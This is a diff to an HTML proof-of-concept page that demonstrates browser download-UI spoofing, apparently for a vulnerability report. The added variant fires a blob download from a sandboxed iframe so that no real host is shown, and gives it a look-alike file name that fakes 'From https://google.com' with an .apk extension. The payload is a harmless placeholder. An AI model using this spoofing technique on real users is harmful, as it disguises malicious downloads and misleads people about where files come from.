@@ -40,7 +40,16 @@
 
   <button id="go">Variant A — fake "From" line</button>
   <button id="go2">Variant B — hidden extension</button>
-  <button id="go3">Variant C — no real host in subtitle</button>
+  <button id="go3">Variant C — no real host in subtitle (data:)</button>
+  <button id="go4">Variant D — no real host in subtitle (blob:null)</button>
+
+  <iframe id="sb" sandbox="allow-scripts allow-downloads" style="display:none"
+    srcdoc="&lt;script&gt;
+      const NAME = 'ini aplikasi apa From https\u2236\u2215\u2215google.com.apk';
+      const u = URL.createObjectURL(new Blob(['x'], {type:'application/octet-stream'}));
+      const a = document.createElement('a');
+      a.href = u; a.download = NAME; a.click();
+    &lt;/script&gt;"></iframe>
 
   <pre id="name"></pre>
 
@@ -96,6 +105,12 @@
     a.href = "data:text/html,<b>x</b>";
     a.download = NAME_A;
     a.click();
+  };
+
+  // D: blob from a sandboxed iframe (opaque origin) — source is blob:null/… → "(data)"
+  document.getElementById("go4").onclick = () => {
+    const f = document.getElementById("sb");
+    f.srcdoc = f.srcdoc;
   };
 </script>
 </body>
